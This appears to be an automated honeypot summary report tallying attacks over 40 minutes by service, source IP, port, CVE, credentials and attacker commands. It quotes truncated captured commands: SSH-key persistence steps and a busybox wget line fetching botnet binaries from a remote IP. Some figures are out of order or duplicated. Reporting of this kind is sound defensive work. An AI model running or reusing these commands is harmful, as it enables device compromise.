Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-12T22:01:31Z
**Timeframe Covered:** 2025-10-12T21:20:01Z to 2025-10-12T22:00:01Z
**Log Files Used:**
- agg_log_20251012T212001Z.json
- agg_log_20251012T214001Z.json
- agg_log_20251012T220001Z.json

---

### Executive Summary

This report summarizes 15,326 malicious events captured by the honeypot network over a 40-minute period. The most targeted service was Cowrie (SSH/Telnet), accounting for over 27% of all interactions. A significant portion of attacks originated from IP address `86.54.42.238`, primarily targeting mail services. A notable observation is the repeated exploitation attempts related to CVE-2022-27255 (Realtek eCos SDK) and persistent SSH-based attacks involving attempts to add a malicious public key to `authorized_keys`. Several commands indicate efforts to download and execute malware payloads from a remote server.

---

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 4231
- **Honeytrap:** 3147
- **Sentrypeer:** 1957
- **Ciscoasa:** 1854
- **Mailoney:** 911
- **Suricata:** 1635
- **Dionaea:** 1361
- **Adbhoney:** 32
- **Tanner:** 68
- **ElasticPot:** 30
- **H0neytr4p:** 51
- **Redishoneypot:** 25
- **ConPot:** 10
- **Honeyaml:** 12
- **Wordpot:** 1
- **Ipphoney:** 1

**Top Attacking IPs:**
- 86.54.42.238: 821
- 45.128.199.212: 1146
- 45.91.193.63: 530
- 4.213.160.153: 486
- 223.100.22.69: 420
- 172.86.95.98: 343
- 62.141.43.183: 325
- 103.97.177.230: 325
- 186.118.142.216: 154
- 147.78.100.99: 220
- 179.43.150.26: 185
- 103.159.199.42: 199
- 103.181.142.244: 143
- 165.154.1.18: 172
- 203.228.30.198: 115
- 143.198.195.7: 118

**Top Targeted Ports/Protocols:**
- 5060: 1957
- 25: 915
- 22: 730
- 445: 416
- TCP/21: 218
- 5903: 186
- 81: 93
- 21: 110
- 5908: 82
- 5909: 81
- 5901: 74
- 8333: 76
- 9000: 54
- 3306: 44
- 443: 63
- 9200: 27
- 6379: 17
- 8291: 19

**Most Common CVEs:**
- CVE-2022-27255 CVE-2022-27255: 21
- CVE-2024-3721 CVE-2024-3721: 16
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 4
- CVE-2002-0013 CVE-2002-0012: 4
- CVE-1999-0183: 2
- CVE-2006-0189: 2
- CVE-2019-11500 CVE-2019-11500: 1
- CVE-2002-1149: 1
- CVE-2018-10562 CVE-2018-10561: 1
- CVE-2023-26801 CVE-2023-26801: 1

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 13
- `lockr -ia .ssh`: 13
- `cd ~ && rm -rf .ssh && ...`: 13
- `Enter new UNIX password: `: 9
- `Enter new UNIX password:`: 9
- `cat /proc/cpuinfo | grep name | wc -l`: 10
- `cat /proc/cpuinfo | grep name | head -n 1 | ...`: 10
- `free -m | grep Mem | ...`: 10
- `ls -lh $(which ls)`: 10
- `which ls`: 10
- `crontab -l`: 10
- `w`: 10
- `uname -m`: 10
- `top`: 10
- `uname -a`: 9
- `whoami`: 9
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...`: 1

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1: 391
- ET SCAN NMAP -sS window 1024: 167
- ET FTP FTP PWD command attempt without login: 109
- ET FTP FTP CWD command attempt without login: 109
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 85
- ET INFO Reserved Internal IP Traffic: 61
- ET CINS Active Threat Intelligence Poor Reputation IP group 42: 20
- ET CINS Active Threat Intelligence Poor Reputation IP group 46: 25
- ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255): 12

**Users / Login Attempts (user/pass):**
- cron/: 56
- 345gs5662d34/345gs5662d34: 12
- root/1qazxsw2: 7
- deploy/123123: 6
- Admin/admin123: 4
- ansible/ansible: 6
- holu/holu: 5
- admin1234/admin1234: 4
- root/3245gs5662d34: 4
- user/Admin@123: 4
- monitor/monitor: 4
- music/music: 4

**Files Uploaded/Downloaded:**
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- gpon8080&ipv=0
- soap-envelope
- addressing
- discovery
- env:Envelope>
- json

**HTTP User-Agents:**
- None observed.

**SSH Clients:**
- None observed.

**SSH Servers:**
- None observed.

**Top Attacker AS Organizations:**
- None observed.

---

### Key Observations and Anomalies

1.  **Persistent SSH Key Injection:** A recurring and dominant command sequence involves attackers attempting to remove SSH immutability, delete the `.ssh` directory, and insert a specific RSA public key. This indicates a coordinated campaign to gain persistent access.

2.  **Malware Download and Execution:** The command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...` is a clear indicator of an attempt to infect the system with various architectures of a botnet client (`urbotnetisass`). This suggests the honeypot was identified as a potential IoT/embedded device.

3.  **CVE-2022-27255 Exploitation:** The Suricata signature for CVE-2022-27255 (a buffer overflow vulnerability in Realtek's eCos SDK) was triggered multiple times. This is a popular target for threat actors looking to compromise routers and IoT devices.

4.  **High Volume Scanning:** IPs `86.54.42.238` and `45.128.199.212` were exceptionally active, with the former focusing on port 25 (SMTP) and the latter on various ports, indicating large-scale, automated scanning operations.
